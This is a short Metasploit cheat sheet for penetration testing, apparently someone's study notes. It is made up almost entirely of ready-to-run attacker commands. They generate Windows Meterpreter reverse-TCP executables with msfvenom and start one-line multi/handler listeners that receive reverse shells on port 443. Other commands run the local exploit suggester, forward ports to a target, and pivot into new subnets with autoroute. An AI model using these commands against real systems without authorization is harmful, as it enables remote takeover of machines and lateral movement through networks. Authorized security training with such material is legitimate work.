#### Starting metasploit
```bash - kali
sudo msfdb run
```

#### Windows exe
64:
```bash - kali
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$KALI LPORT=443 -f exe > meterpreter64.exe
```

86:
```bash - kali
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$KALI LPORT=443 -f exe > meterpreter86.exe
```

#### Meterpreter Listener 1 Liner
64:
```bash - kali
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST $KALI;set LPORT 443;run;"
```
86:
```bash - kali
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $KALI;set LPORT 443;run;"
```

#### Non-Meterpreter Listener 1 Liner
64:
```bash - kali
msfconsole -x "use exploit/multi/handler;set payload windows/x64/shell_reverse_tcp;set LHOST $KALI;set LPORT 443;run;"
```
86:
```bash - kali
msfconsole -x "use exploit/multi/handler;set payload windows/shell_reverse_tcp;set LHOST $KALI;set LPORT 443;run;"
```
#### Local Exploit Suggester
```meterpreter - kali
run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true
```

```metereprter - kali
set verbose true
```

```metereprter - kali
set exitonsession false
```

#### Port Forward
```meterperter - kali
portfwd add -l 80 -p 80 -r $TARGET
```

#### Pivoting
```meterperter - kali
background
```

```meterperter - kali
use post/multi/manage/autoroute
```

set subnet to the new found subnet:
```meterperter - kali
set SUBNET x.x.x.x
```

```meterperter - kali
set SESSION 2
```

```meterperter - kali
exploit
```








